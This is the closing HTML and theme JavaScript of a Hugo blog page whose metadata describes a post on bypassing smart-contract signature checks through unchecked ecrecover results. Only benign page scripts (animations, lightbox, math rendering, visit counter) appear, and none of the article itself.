aosInit=()=>{AOS.init({duration:1e3,easing:"ease",once:!0,offset:50})};document.readyState==="loading"?document.addEventListener("DOMContentLoaded",aosInit):aosInit()</script><script src=/js/pjax_main.js integrity crossorigin=anonymous data-pjax></script><script>var setupFirework=()=>{if((!!1||!window.matchMedia("(max-width: 768px)").matches)&&window.firework){const e=JSON.parse('{"excludeelements":["a","button"],"particles":[{"colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"duration":[1200,1800],"easing":"easeOutExpo","move":["emit"],"number":20,"shape":"circle","shapeOptions":{"alpha":[0.3,0.5],"radius":[16,32]}},{"colors":["var(--red-0)"],"duration":[1200,1800],"easing":"easeOutExpo","move":["diffuse"],"number":1,"shape":"circle","shapeOptions":{"alpha":[0.2,0.5],"lineWidth":6,"radius":20}}]}');e.excludeElements=e.excludeelements,delete e.excludeelements,window.firework(e)}}</script><script src=https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js defer onload=setupFirework() integrity=sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T crossorigin=anonymous></script><div id=lazy-script><div><script data-pjax>window.REIMU_POST={author:"Koyphshi",title:"Only-invited party",url:"https://lanaceryasser.github.io/posts/indit/",description:"Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets.",cover:"https://lanaceryasser.github.io/images/banner.png"}</script><script src=/js/insert_highlight.js integrity crossorigin=anonymous data-pjax></script><script src=/js/tabs.js integrity crossorigin=anonymous data-pjax defer></script><script type=module data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script src=https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js data-pjax integrity=sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC+gqPB3IBNO35xjZK3Ejb6oONRpDbPg crossorigin=anonymous></script><script src=https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js data-pjax integrity=sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh crossorigin=anonymous></script><script data-pjax>var renderMath=()=>{if(!window.renderMathInElement)return;window.renderMathInElement(_$("article"),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})};document.readyState==="loading"?document.addEventListener("DOMContentLoaded",renderMath,{once:!0}):renderMath()</script></div></div><script src=https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js async integrity=sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S crossorigin=anonymous></script><script>"serviceWorker"in navigator&&navigator.serviceWorker.getRegistrations().then(e=>{for(let t of e)t.unregister()})</script><script>const reimuCopyright=String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;console.log(String.raw`%c ${reimuCopyright}`,"color: #ff5252;"),console.log("%c Theme.Reimu %c https://github.com/D-Sketon/hugo-theme-reimu ","color: white; background: #ff5252; padding:5px 0;","padding:4px;border:1px solid #ff5252;")</script></body></html>
